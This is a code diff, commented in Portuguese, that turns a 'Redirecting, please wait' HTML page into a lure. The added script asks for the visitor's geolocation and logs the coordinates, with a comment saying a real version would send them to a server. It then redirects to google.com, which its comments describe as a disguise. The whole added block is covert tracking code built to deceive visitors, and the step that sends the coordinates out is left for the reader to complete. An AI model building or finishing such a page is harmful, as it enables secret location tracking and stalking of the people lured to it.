@@ -7,7 +7,34 @@
     <h2>Redirecionando...</h2>
     <p>Por favor, aguarde.</p>
     <script>
-        // O código de rastreamento virá aqui
+        // Tenta obter a localização
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // Sucesso: a localização foi permitida
+                function(position) {
+                    // Captura as coordenadas
+                    var lat = position.coords.latitude;
+                    var lon = position.coords.longitude;
+                    
+                    // Envia as coordenadas de volta para o R (simulação)
+                    // NA VIDA REAL, aqui um código enviaria para um servidor
+                    console.log("Localização capturada:");
+                    console.log("Latitude: " + lat);
+                    console.log("Longitude: " + lon);
+                    
+                    // Redireciona para um site real para disfarçar
+                    window.location.href = "https://www.google.com";
+                },
+                // Erro: a localização foi negada
+                function(error) {
+                    // Mesmo se negar, redireciona para disfarçar
+                    window.location.href = "https://www.google.com";
+                }
+            );
+        } else {
+            // Se o navegador não suportar geolocalização, só redireciona
+            window.location.href = "https://www.google.com";
+        }
     </script>
 </body>
 </html>
